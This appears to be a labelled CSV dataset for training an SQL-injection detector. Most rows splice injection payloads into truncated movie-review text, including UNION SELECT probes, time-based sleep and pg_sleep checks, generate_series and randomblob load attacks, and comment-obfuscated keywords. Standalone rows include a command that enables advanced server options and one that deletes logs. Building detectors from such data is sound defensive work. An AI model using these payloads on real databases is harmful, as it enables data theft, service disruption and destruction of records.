query,label,length
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr1 where 4949 = 4949,1,375
""" /*The funniest movie from Britain I have ever seen, ""The Supergrass"" is a tale of sex, drugs, cream teas, and murder by the seaside. Dennis Carter (Adrian Edmonson), average moron, is out to impress his so-called girlfriend, Andrea (Dawn French), because she thinks he is too law-abiding. So, to get her to come along with him on a romantic getaway, he comes up with a scheme that perhaps will impress her and */""",1,415
replace,1,7
"-4596"" unio/*Because others have gone to the trouble of summarizing the plot, I'd like to mention a few points about this film. There may be spoilers here; I don't care enough to filter them out.<br /><br />- Given the film's low budget, the creature design was quite good. It's actually nice to see a direct-to-video horror film that's not slathered with awful CGI. Unfortunately the digital film quality's quite grainy in places, and it's most noticeable in the well-lit white halls of the asylum.<br /><br />- Ridiculous lighting design plagues parts of this film, to say nothing of the variations in the passage of time. I understand the director might ha*/n all select 5761#",1,679
"EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",1,58
"That's how I was when I walked (staggered) out of this ""film"". I couldn't leave, because it was at a film festival and the cinema was full of people. I was stuck in the middle. Trapped.<br /><br />The tiny fragment of original footage which attempted to bind this film together features some of the worst acting ever to grace the big screen. The daughter was a stand out performance - stand out in the bad sense.<br /><br />Thge cinematography was hideous, consisting of disjointed framing and some of the oddest lighting I've witnessed.<br /><br />As for the stock footage... well at first one...<br /><br />Wait.<br /><br />Why am I reviewing this film? Why do I acknowledge its existence? Please, don't watch it. Do something useful with two hours of your life and go watch some paint dry.""1' )  as xskm where 3525 = 3525 and 2435 = 6513",1,840
"This film grabs you from the opening scenes and never lets go. You watch indulgently upon viewing Janos Szaby's excitement over coming to America. He's a likable fellow. You cannot help being fond of him even when his eagerness is replaced by bitterness as his fortunes turn. You know that in his circumstances,you would be forced to make the same choices he does to survive. This movie comments on society's worship of beauty and all things superficial and is only more true in the culture of the twenty-first century. Janos himself becomes""1' )  rlike sleep ( 5 )  and  ( 'boto' = 'boto",1,588
"select * from g/*Jack Frost 2 was a horrible, terrible, sadly pathetic excuse for a sequal to a great movie. The original, was a low budget comedy horror film about a murdered who was turned into a snowman after an accident with some toxic waste. And the snowman went around murdering people, and avoiding blow dryers like the plague. This, however, was a far cry from the quality of the original. It seems like this even had a lower-budget because for some reason, after an hour into this film, I still hadn't seen the snowman. Some revenge he's getting if he's always in the form of Ice cubes with a cheesy voice-over and a little shake of the cooler he rests in to give ani*/enerate_series ( 3427,3427,case when  ( 3427 = 7516 )  then 1 else 0 end )  limit 1--",1,763
" UNION ALL S/*Tony Arzenta, a Sicilian hit-man or professional killer, decides to leave the business, and his former employers do not agree.In te*/ELECT",1,152
"Bloody Birthday opens to a shot of Meadowvale General Hospital. There three babies are being born at precisely the same time during a total eclipse. A caption informs us that it is now 'Meadowvale, California June 1, 1980'. Two teenage lovers, Duke Benson (Ben Marley) and Annie Smith (Erica Hope) are getting down to business in an open grave. They hear noises and Duke investigates. Both Duke and Annie are murdered. Sheriff Jim Brody (Bert Kramer) is baffled and only has the handle of a child's skipping rope that Annie was holding, as a clue. Unfortunately before Sheriff Brody can solve the case his youngest daughter Debbie (Elizabeth Hoy) and two of her friends Curtis Taylor (Billy Jayne as Billy Jacoby) and Steven Seton (Andy Freeman) murder him. Just as t'1"" )  where 1410 = 1410",1,791
"While I can't deny that his movies are often entertaining, I have always personally felt that Martin Scorsese is just a little overrated in his abilities. His use of flashy stylistics in a good number of his movies seems to scream ""Look at me, aren't I an imaginative director?"". His best film that I have seen is the one with the least added flourishes, the superlat'1"" and elt ( 4249 = 4249,7259 )  and ""tmxx"" = ""tmxx",1,419
"Other commenters have described this movie as ""classic 1950s SciFi"" with clever use of stock footage and documentary footage, and clever character interaction.<br /><br />Nothing could be further from the truth.<br /><br />Yes, this is classic 1950s SciFi...but 1950s SciFi at its most blindingly stupid worst.<br /><br />Consider that the Mantis's first prey is a radar station shown first from the air, then on the ground... but the station is (from the air) pictured as on a mountaintop, with snow on one side and semi-cleared dark ground on the other side, but when (on the ground) investigato""1'|| ( select 'ydvg' from dual where 7108 = 7108",1,646
"That movie while slightly flawed was entirely entertaining. About half an hour into Be Cool, I started to have Hollywood Homicide flashbacks. But guess what? This is worse. Even the dance number is bad. I like most of the cast in this movie, so that makes me feel bad about writing a negative review of it but I feel obligated. The Rock, Andre 3000, and Vince Vaughn were in a comedy. No one else seemed to decide what movie genre they were acting in. I feel bad for Travolta because he brought the same Chili Palmer from Get Shorty to this movie. He was totally consistent in the role, but this movie is so different from the original that the character sticks out like a sore thumb. I was going to give this movie 4/1""1' )  or elt ( 6272 = 6272,sleep ( 5  )  )   and  ( 'xwsb' = 'xwsb",1,786
"My wife and kids was and still is the best comedy series on TV ever made.I really enjoyed it and everyone in the u.k still watch the recaps.The Wayans bros. should all somehow be featuring together in a comedy show.My wife and kids was a comedy the whole family could watch and you don't get that very often.Isn't there anything we can do to""1%' and sleep ( 5 )  and '%' = '",1,374
"^^contains spoilers^^<br /><br />This movie is utter crap. Do not watch.<br /><br />There is no one in this movie to root for, or even like, except for the wife, and she wins by default. Everyone is selfish, and many things happen that make no sense.<br /><br />The acting is mediocre at best and everyone breathes too heavily about everything. No one can even cry believably.<br /><br />If you leave the room for even a second, then something totally out of left field will happen, and it will make NO SENSE WHATSOEVER.<br /><br />For example, I left the room for a second, while Jennie Gart""1 )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( 9112 = 9112",1,698
"%2/*I would have to say that in general Barbie Movies have impressed me. I have a 5 year old Barbie fanatic niece and she watches them all the time so needless to say I have seen quite a lot of Barbie these holidays, but I am not sick of them.<br /><br />This film, visually, has a lot to offer, especially the backgrounds, and the animation of the characters has improved with each new movie. One thing I noticed in particular was a vast improvement in the animation of Barbie's hair in this film. It has a lovely range of excerpts from classical music and I think that this is great, as it exposes a new generation to the classics. This film is well worth ago, especially if you have young relievers. They will be entertained for hours!*/1",1,741
"So I'm at home, flipping channels one night, and I come across this man wearing heels and makeup, standing in front of a colored background on HBO. Naturally, I did a double-take and decided I'd watch for a little whil""1"" or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  ",1,295
"I have loved the book ""A Little Princess"" for most of my life, and was very excited that there was a movie. But I was appalled at this adaptation. Not only is the acting wooden, and the plot a convoluted mish mash of various incidents in the book, but the theme is all wrong. The real theme of the story should be that a girl can be a princess only when she behaves like one, as Sara does when she gives 5 of her 6 buns to a beggar child, even when she herself is very hungry. The theme of the movie seems to be that all girls are princesses, which cheapens Sara's actions considerably, and seems more like it should be written on a Hallmark card than applied to this story.<br /><br />There are many other things wrong with this movie- too many to list, but here are just a few of the larger ones: This story should be set in Britian in the mid 1800s, not America during the first w'1"" )  as mibc where 3113 = 3113",1,915
"A bit too much Mediterrenean machismo for me. The cast was beautiful, lovely to watch in all of the romantic scenes. The locale was beautiful with azure skies and azure water. It just was not convincing to me that such an egomaniac crud bent on nothing but his building, could attract so many beautiful, vulnerable, women. Only in the Mediterranean I guess. Certainly in no world I am familiar with. The macho men were really obnoxious, and I found it difficult to believe that the female characters could have anything to to with them for so long. The screenplay, cinematography, directing, etc. was set up to deliver a Class B film, the central effort being on showing scenes of beautiful exposed female breasts. It was aesthetically nice for a while but it could not sustain a very mediocre film.""1'  )  )   and 3355 = 6012 and   (  (  'ofmy' = 'ofmy",1,853
This was the third remake of SLEEPING WITH THE ENIEMY After YAARANA(1995) and AGNISAKSHI(1996)<br /><br />AGNISAKSHI was the only one which worked and was a better film<br /><br />DARAAR is directed by Abbas Mustan who sadly failed in their attempt here<br /><br />the story was good but the handling wasn't that good and the heroine was shown too regressive and the climax too was disappointing<br /><br />Direction is bad Music is good<br /><br />Rishi reprises his role of YAARANA(strangely which also was a remake of SWTE) and looks too fat for the lead and is okay Juhi is decent while Arbaaz tries too hard in his debut and does manage in many scenes to chill the audiences but his voice was terrible Johny is too loud'1 where 7882 = 7882,1,744
s,1,1
"I usually try to construct reasonably well-argued critiques of films, but I can not believe this got past the script stage. The dialogue is appalling, the acting very dodgy, the accents just awful, and the direction and pacing is scrappy at best.<br /><br />I don't remember the last time I saw a film quite this bad. Joseph Fiennes, pretty as he is, might just have killed his career as quickly as it started.<br /><br />The'1wwis",1,431
"Well made and stylish while still ultimately making sense this thriller would work better for non giallo fans to get interested in the genre than the later Argento entries which go overboard in all directions.<br /><br />For fans of these crazed Italian thrillers, they will appreciate George Hilton and the turns his character takes and what he's put through. The camera-work is fresh with dashes of graphic violence and odd, but appropriate choices and a good not overblown music score as well. The less you know about the story the better to make it work.<br /><br />The only thing lacking in keeping this from being a great Sergio Martino directed giallo is that the story doesn't have that extra sexual or psycholo'-2233' or  ( 1807 = 7274 ) *7274",1,752
"This was a great movie for being only 67 minutes long. There was an aspect of film-noir contained in this movie and I am glad that Nolan picked to film it in black and white. The plot is simple yet entertaining that keeps you engaged. Even the dialogue was good along with the acting. It reminded me of what was to come in Memento by not being in chronological order. I liked how the main character tried to use what Cobb taught him for example saying ""everyone has a box"" which he put his personal things into. Also, on the writer's door was the batman logo which seemed ironic because Christopher Nolan would later direct Batman Begins and The Dark Knight, two other great movie"" end and  ( 'hmtt' like 'hmtt",1,710
grant connect to name,1,21
-9975 where 9760 = 9760 order by 1/*I saw this film at the 3rd Adelaide International Film Festival at the Palace cine*/--,1,122
"-8753 )  order by 1#--One of Disney's best films that I can enjoy watching often. you may easily guess the outcome, but who cares? its just plain fun escape for 1 hour forty-two minutes. and after all wasn't movies meant to get away from reality for just a short time anyway? The cast sparkles with delight. -magictrain",1,319
"I saw this movie when it was first released and thoroughly enjoyed it. What a movie. I am in my 40s now and have 2 teenage kids and I would like them to see this movie. I would recommend it to anyone who loves a romance movie or older Elton John music.<br /><br />I have searched most of the stores that sell both new and old movies but have not come ""select count ( * )  from generate_series ( 1,5000000 )  and ""%"" = """,1,419
"I'm 14, so you probably would think I have never heard of George Burns or Walter Matthau or anyone like that. Boy are you wrong. I had heard that George Burns was in this movie and that he won an Academ'1"" )  where 8196 = 8196",1,226
"11111111111111111111111111111111111177777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777771"" where 2886 = 2886",1,240
"1 where 4787 = 4787--I remember seeing this on TV in the late 70s - and it stayed with me! It's charming, loud, colourful - a great kids film. I put it on for some friends at a party recently - and naturally they thought I was mad and expected something sick to happen to the p",1,277
"&--It's heart-warming to see a movie that doesn't bash males. In this one the wife/mother leaves her family to ""get in touch"" with herself - or pursue her libido. The father stays with and nurtures the kids, letting neither his work nor his love life interfere with his love of and responsibility to them.",1,305
"As a big fan of David Mamet's films and plays, especially his first film House of Games that also starred Joe Mantegna, I was expecting great things from this film. Instead, I found myself annoyed by the film's superficiality and lack of credibility. Racial slurs are thrown about without any feeling or meaning behind them, in the hopes of setting up a racial tension that for ',s",1,381
limit,1,5
+sqlvuln,1,8
s,1,1
"1 where 3744 = 374/*I stumbled upon Nine Dead recently and read the current reviews thinking I could deal with an average movie. This movie however was slightly below average, yet watchable. The script was poorly written and the acting was at average for a B-level movie with a couple standing out as pretty good. The plot borders on that of Saw, teach people what they did wrong in a situation and try to make them appreciate life more, but that is really where the comparison ends. Nine dead tries to have heart and purpose behind simple ideas that are not new. The main fault that I found in Nine dead, was the slap in the face to the viewer of flashbacks that occurred 3 minutes before in the film and were completely unnecessary and a completely inadequate ending that people won't see coming, in a bad way. Barring any spoilers I have seen the worse of bad movies and even they didn't*/4",1,893
"1' )  and 7533 = 7533--By now you should already know about this film, the Jessica Simpson ""bomb"" that pretty much went straight to video (limited, anemic theatrical run). Basically, Ms. Simpson's Katie travels f",1,212
"1  )  )   as rbcf where 1053 = 1053--This is a horrible little film--and unfortunately, the company that made this short made several others. The short is essentially a one-joke idea that wasn't funny to begin with and may also offend you. It certainly made me uncomfortable watching very young children (most appeared about 2 years-old) cavorting about and pretending to be adults--in thi",1,389
"/*Here's a spoof that's guaranteed to entertain folks in the IQ range of Homer Simpson. It's a cheap shot at every great Superhero, notably Spiderman and Batman. But it doesn't end there; it gets progressively worse until it disintegrates into a pathetic ensemble of slapstick trollop by the truckload.<br /><br />For those interested in the plot, you've only to watch Spiderman while under the influence of some heavy narcotic. What you get is Dragonfly Man  a boy wonder, who loves the girl next door, suddenly inheriting some stupendous super-powers.<br /><br />The rest of the script is as predictable as waking */a'",1,621
"Kurt Thomas in one of the series of gymnast olympic stars turned movie stars movies that mercifully only includes one other..Mitch Gaylord in American Anthem...at least that one had Janet Jones..this one has...um... a gymnast using his martial arts and his gymnastic skills to save a european country from dictatorship..sure it could happen.. on a scale of one to ten.. a 0""1  )  )   as quap where 7625 = 7625",1,409
1  )  )   as syot where 1199 = 1199--Verry classic plot but a verry fun horror movie for home movie party Really gore in the second part This movie proves that you can make something fun with a small budget. I hope that the director will make another one,1,254
c,1,1
0,1,1
"What can you say about this movie? It was not terrible, but it was not good! Two days earlier I had watched Lillies and that was one of the best Gay films I have ever seen. So this was not the best time to watch a mediocre Gay flick.<br /><br />The story was silly and the acting was OK. It was not bad enough to turn off, but it had some bad moments and some terrible stereotyping. It was not very well cast either.<br /><br />Would I recommend this movie? No you would be wasting your time and money. I don't understand why movies like these are made and who is funding them. Spend your time Watching Noah's Arc on Logo instea""iif ( 2205 = 4764,1,1/0 ) ",1,655
"I watched this film with a group of Nazis, a French Archaeologist and my ex-girlfriend on a small island in the Mediterranian.<br /><br />When the tape was started, myself and my girlfriend were tied to a wooden stake at the far end of this cave like area. I told her to close her eyes and no matter what happened not to open them. The Nazi's and the archaeologist didn't close their eyes and after a few seconds started screaming. The Nazi's faces melted and the archaeologist's head exploded.<br /><br />After a few seconds the video tape popped out of the VCR and landed back in it's box and the top snapped shut. Myself and my girlfriend were left unharmed.<br /><br />Consequent to this experience, the video cassette was put in a wooden crate and stored in a huge warehouse of identical wooden crates, never"" select sleep ( 5 )  and  ( '%' = '",1,849
"1"" where 6004 = 6004--I went to an advance screening of this movie thinking I was about to embark on 120 minutes of cheezy lines, mindless plot, and the kind of nauseous acting that made ""The Postman"" one of the most malignant displays of cinematic blundering of our time. But I was shocked. Shocked to find a film starring Costner that appealed to the soul of the audience. Shocked that Ashton Kutcher could act in such a serious role. Shocked that a film starring both actually engaged and captured my own emotions. Not since 'Robin Hood' have I seen this Costner: full of depth and complex emotion. Kutcher seems to have tweaked the serious acting he played with in ""Butterfly Effect"". These two actors came into this film with a serious, focused attitude that shone through",1,777
procedure,1,9
"The Great Caruso displays the unique talents of Mario Lanza. He shows great acting capacity and is in top form as a lyrical singer, paired with Dorothy Kirsten, soprano of the Metropolitan Opera. Indeed, I dare to say that he performs some songs better than Caruso (check A'Vuchella from Tosti and La Danza from Rossini). The MGM art and music departments also did a good job. This movie could be perfect, were it not for the awkward presence of Ann Blyth; we see that she is trying her best, dressed in the fifties style in scenes just before 1920 - unforgivable. Lanza deserved a better leading lady, and Blyth should stick to less demanding productions. Also notice that Ms. Kirsten sings most of the opera duets of the film with Lanza, giving the wrong'1'|| ( select 'hkvl' from dual where 8882 = 8882",1,805
 union select * from users where login  =  char ...,1,51
c,1,1
s,1,1
"In a way this is the disaster Fellini has been working towards all his life. The line between absurd masterpiece and free association bullshit is very small, and what category a film will ultimately fit in will often just depend on personal feelings. That said, ""Casanova"" left me in cold admiration for its sets and little more that cannot be summed up more adequately by Bukowski: <br /><br />""Casanova""1'  )  )   as dipp where 1714 = 1714",1,441
"1 a/*OK everybody is so enthused by this film I hardly dare add a negative review but I just did not enjoy this movie.<br /><br />I have to say first I saw the film in Russian language overdub so I will have missed some dialog, but not much.<br /><br />Nice things first. There are some hilarious moments (the Elvis impersonator for instance). Actors seem well casted, also the Russians. Efremova is great and Goldblum is very good. Which brings us to the downsides of this movie. First of all. There is hardly any story and the end we know already: Yeltsin wins. So no drama or suspense. They tried to solve this problem with an emerging affair between the actors mentioned above, but that story kind of evaporates.<br /><br />More importantly, the film does not represent reality. The Russians at the level of politics and society portrayed in this movie are not funny, they are a serious and dangerous lot. I am willing to believe that flying in*/nd 1 = 1",1,958
"Pierce Brosnan will probably be the only thing familiar in Richard Attenborough's new biopic. The rest is new to international audiences: Canadian history and First Nations Culture.<br /><br />""Grey Owl"" is a light examination of how an man came to be adopted into the Ojibway of Northern Ontario, learning and preaching environmentalism decades before it became politically correct to do so. The film contains a love story, a moral message, and a man tortured by his past. That torture, though, is not always brought to life with the dramatic impact that it might.<br /><br />Nevertheless, it is a film which holds its audience without any violence. It pays deep respect to Canada's First Nations, and presents them in a dignified and non-stereotypical manner. Brosnan's performance is somewhat stiff, but I suspect th""select case when 5308 = 6745 then 1 else null end--",1,871
3.10E+17,1,8
"I loved October Sky. The thing I loved most had to be the music. It worked two ways: in the first hour of the film, it gives the viewer a time-frame. This is done by playing songs from the late Fifties. In the second hour, an instrumental score takes over. The music now fits the mood of the film perfectly.<br /><br />I did not only enjoy the music, I also quite enjoyed the cast. Jake Gyllenhaal as Homer Hickam was es""  )  )   or pg_sleep ( __TIME__ ) --",1,457
"select case when 6555 = 7349 then 1 else null end--""Undercurrent"" features a top-notch cast of wonderful actors who might've been assembled for the perfect drawing-room comedy. Alas, they are pretty much wasted on a 'woman's view' potboiler--and a paper-thin one at that. Katharine Hepburn is indeed radiant as a tomboy/old maid who finally marries, but her husband is deeply disturbed and harboring dark family secrets. Director Vincente Minnelli has absolutely no idea how to mount this outlandish plot, concocted by Edward Chodorov from a story by Thelma Strabe",1,564
SELECT * FROM CustomersLIMIT 3,1,30
"It was a movie that made ya think a little. Some parts a little cheesy, some parts pretty good. Plot did thicken at times and just when you thought Angella (Sandra) found a friend the friend was fraud or dead. All I got to say is that DENNIS MILLER should have been in the whole movie. His character was the best, very refreshing after all the crap Angella went through. He would have lift'1 )  as hggi where 6511 = 6511",1,420
"1'qhfy<'"">utwq--So far Miguel Bardem's career it's been one of the more dreadful of recent Spanish cinema. He's made nothing but rubbish... until now. ""Incautos"" has been quite a surprise: it's a serious film, with rhythm, with a great cast and very entertaining.<br /><br />The art of robbing, that's what ""Incautos"" is about. A film much alike to David Mamet's ""House of game"" and stuff like that. A thousand of twists in the script, a",1,437
"-1127 or 73/*Like all Carnosaur movies, this is a joke. The way the dinosaurs move, reminds me of when my sister plays with her dolls, because they cannot be any stiffer or more fake-looking than they were.<br /><br />The plot had no sense whatsoever. I mean, first they're on a bus, then in a warehouse then, all of a sudden, they're on a boat. And let's be serious, does it make sense that a couple of dinosaurs can stay together on a van, or on a ship? I thought dinosaurs were the biggest animals, and now they can fit on a moving van. It sounds stupid even when you think about it.<br /><br />The only reason for wh*/91 = 4954",1,631
limit,1,5
LImIt,1,5
"This film breeches the fine line between satire and silliness. While a bridge system that has no rules may promote marital harmony, it certainly can't promote winning bridge, so the satire didn't work for me. But there were some items I found enjoyable anyway, especially with the big bridge match between Paul Lukas and Ferdinand Gottschalk near the end of the film. It is treated like very much like a championship boxing match. Not only is the arena for the contest roped off in a square area like a boxing ring, there is a referee hovering between the contestants, and radio broadcaster Roscoe Karns delivers n'@variable",1,624
'1,1,2
DELETE FROM logs WHERE 1=1;,1,27
?,1,1
You've got to think along the lines of Last Tango in Paris for this one because the mood and emotion runs along the same lines and maintains the same height'n,1,158
"Homeward Bound is a beautiful film. Y'know the part where Shadow falls down the ditch... thingy, I *cried*, considering I was only six, I cried! it takes a lot to make me cry! The dogs and the cat are excellently trained. A nice family movie, *not* for completely hardened non-fluffy people or animal-haters but could for soft-as-crap a.k.a. people like me.<br /><br />A good film overall, 10/10!""1' where 9242 = 9242",1,417
replace,1,7
"This movie tries its darndest to capture that classic bad canadian movie feel:<br /><br />""quirky"" and obnoxious characters (a few); ""qui'1'+ ( select qydm where 6019 = 6019",1,173
"Rosie wasted a lot of TV time talking about the Tainos as if they were super influential in the dynamics of the modern day Puerto Rican. They were not. The truth is that the Africans and the Spanish were and she knows it. What kills me is that she is standing on the screen looking like some average light skin black chick ( with an obvious black dad""1""  )  )   as azak where 4911 = 4911",1,387
1wwis,1,5
"This is the best made-for-TV movie of all-time! Am I saying this because I'm a huge Silverstone fan? Partially, but even without her, I'd still see it. I'm a fan of serial killer genre films, and believe this to be a great entry in that category. Also, Mary Giordano easily ranks among Alicia's top five character creations. Totally memorable - like she really exists. I'd have her on my side, too, if there was a mystery to be solved. She plays the character, like she does with her real life, with complete confidence in everything she does. Seems sweet, honest, nice...just like she is in real 'call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and  ( 9646 = 9646",1,698
"It kicks you in the stomach. There are other films with more convincing characters, a more realistic story, and maybe even more depth concerning political invocations. But then again, most of these are not directed by Peter Watkins. Maybe the one true genius artist of British Film to emerge out of the 1960s, Watkins has made quite a bunch o""1'  )  )   as xirr where 2425 = 2425",1,379
"I haven't written a review on here in ages but rewatching all of bottom TV show, live shows and this I felt I had to make my views on this movie known! It is, I feel, the perfect comedy movie. It lacks the lovey dovey story lines(I wouldn't really call richies enfatuation with Gina Carbonara love would you? Or him and eddie going up there naked... not love) that make the rest of comedys go from good to crap, it lacks the usual dilemmas that one must overcome in most other comedy movies... unless you count the fact that they poisoned the guests and must escape from the guests""1' )  where 7541 = 7541",1,605
"Takashi Shimizu had a great opportunity with a remake of his original film Ju-On The Grudge. While I haven't seen that film, I would have to wager that there's more imagination and originality (or some rip-off originality, in other wor'’ or ‘1’ = ’1",1,249
"I can't believe that there are people out there who voted 10 for this garbage! Have any of you gained access to a computer in the madhouse where you are undoubtably kept, or is there a special colony where especially crass people are secretly imprisoned that I don't know about?<br /><br />If I was to say what I really thought of this film, none of it would get published.<br /><br />To begin with its 'star' is a no talent idiot who acts like a bad impersonator of Jim Carrey who has hoovered enough angel dust up his nose to resurface the Sahara desert. His name will be a total guarantee that I will not watch a future film with him in it - even if he plays a rock hidden by a crowd.<br /><br />As for the 'plot'. One more crime that we can chalk up to the Nazis is that they were so awful that they can be considered fair game as 'baddies' in tripe like this; mere crim'1%'  )  )   )  rlike sleep ( 5 )  and   (  (   ( '%' = '",1,931
"-8641%' order by 1--Resnais, wow! The genius who brought us Hiroshima Mon Amour takes",1,85
"ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001"" where 8333 = 8333",1,857
"I really liked the first part of this film in Africa for about an hour or so until the animal cruelty by civilized humans in Scotland got to me in the second half and made me so sad I couldn't watch some of it. However, this was done by the filmmaker to make a point that early natural scientists ruined everything alive they didn't understand by ""studying"" it literally to death without considering the rights and comfort of the animals studied, which we know now shouldn't be studied anywhere but in the natural world they inhabit, and as unobtrusively as possible. I do recommend this film as it was a mostly serious and honest story of Tarzan and made a point of showing the gross animal cruelty that was rampant in the 19th century scientific world as well as the pure and simple, beautifully primitive life Tarzan lived as a young man who was found as a baby and raised by chimps after the violent death of his parents in the African jungle.<br /><br />Chr'&apos; OR",1,972
"Beat a path to this important documentary that looks like an attractive feature. Forbidden Lie$(2007) is simply a better (cinematic) version of Norma Khouri's book Forbidden Love, and THAT was a best-seller. An onion-peeling of literary fraud and of a pretty woman, Lie$ is the very best in editorialised reality TV.<br /><br />Cleverly edited and colourful, Broinowski's storytelling is chaptered by moving silhouettes of Norma Khouri meaningfully blowing smoke. I disagree (with Variety) that it's overlong; instead my one slight problem was with the episodic nature of its key players commenting on others' just-recorded testimonials. On a single watching your sense of narrative becomes mired.....so I watched it twice.<br /><br />This Oscar-worthy effort is at once genuinely funny, upsetting, and totally engrossing as it documents one lie after another. Th'1"" )  and 3732 = 3850 and  ( ""edjv"" = ""edjv",1,907
031003000270000,1,15
